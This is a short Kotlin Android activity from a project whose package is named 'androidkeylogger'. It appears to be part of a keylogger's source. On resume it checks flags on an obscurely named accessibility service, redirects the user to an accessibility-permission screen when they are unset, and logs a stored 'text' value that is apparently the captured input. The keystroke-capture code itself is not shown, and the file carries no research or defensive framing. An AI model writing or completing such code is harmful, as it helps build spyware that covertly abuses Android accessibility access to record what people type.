package com.azamovhudstc.androidkeylogger

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.*
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.runBlocking
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.nio.charset.StandardCharsets
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

class MainFixActivity : AppCompatActivity() {
    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            }
        }
    }


    override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        setContentView(R.layout.activity_main)
    }

    override fun onResume() {
        super.onResume()
        checkPermission()
        val sharedPref = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        Log.d("TEXT", "onResume: ${sharedPref.getString("text", "")}")


    }
}
